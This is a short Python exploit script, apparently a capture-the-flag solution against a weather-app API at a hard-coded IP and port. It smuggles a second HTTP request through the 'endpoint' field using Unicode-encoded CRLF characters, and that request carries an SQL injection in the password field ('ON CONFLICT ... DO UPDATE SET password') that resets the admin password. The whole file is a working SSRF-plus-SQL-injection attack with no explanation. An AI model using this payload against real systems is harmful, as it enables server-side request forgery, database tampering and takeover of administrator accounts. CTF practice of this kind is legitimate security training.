import requests
from sympy import content

BASE_URL = "http://206.189.25.173:32542/api/weather"

# Set the username and password
username = 'admin'
password = "admin') ON CONFLICT(username) DO UPDATE SET password='admin';--"

# We need to parse the password string correctly before inserting it into the payload
password = password.replace(" ", "\u0120").replace("'", "%27")
content_length = len(username) + len(password) + 19

# Craft the payload that allows us to update the password
payload = '127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120%s\u010D\u010A\u010D\u010Ausername=admin&password=%s\u010D\u010A\u010D\u010AGET\u0120'%(str(content_length), str(password))

# Send the payload through and verify if it works
data={
    'endpoint': payload,
    'city': 'Melbourne',
    'country': 'AU'
}

r = requests.post(BASE_URL, json=data)
print(r)
